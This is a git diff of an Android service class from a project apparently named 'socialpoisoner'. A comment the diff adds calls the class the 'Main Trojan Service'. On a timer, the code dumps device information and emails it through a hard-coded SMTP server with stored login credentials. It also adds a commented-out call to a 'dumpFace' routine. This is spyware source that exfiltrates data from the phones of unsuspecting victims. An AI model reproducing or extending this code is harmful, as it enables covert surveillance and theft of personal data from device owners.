@@ -4,7 +4,6 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
-import android.os.Looper;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -14,7 +13,6 @@ import com.cakeman.doctorrabb.socialpoisoner.modules.mailer;
 import com.cakeman.doctorrabb.socialpoisoner.modules.messageBuilder;
 import com.cakeman.doctorrabb.socialpoisoner.modules.constants;
 
-import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.util.Timer;
@@ -22,6 +20,7 @@ import java.util.TimerTask;
 
 /**
  * Created by doctorrabb on 16.07.16.
+ * Main Trojan Service (every constants.timer it dumps info about device)
  */
 public class srv extends Service {
     @Override
@@ -73,6 +72,8 @@ public class srv extends Service {
 
             Log.d ("Device Information", dumper.dumpInfo(getApplicationContext()).toString());
 
+           // dumper.dumpFace (getApplicationContext());
+
             mailer m = new mailer ();
             m.sendMail (
                     constants.smtpServer,
@@ -81,7 +82,8 @@ public class srv extends Service {
                     constants.subject,
                     messageBuilder.buildToHtml(),
                     constants.login,
-                    constants.password
+                    constants.password,
+                    null
             );
         }
     }
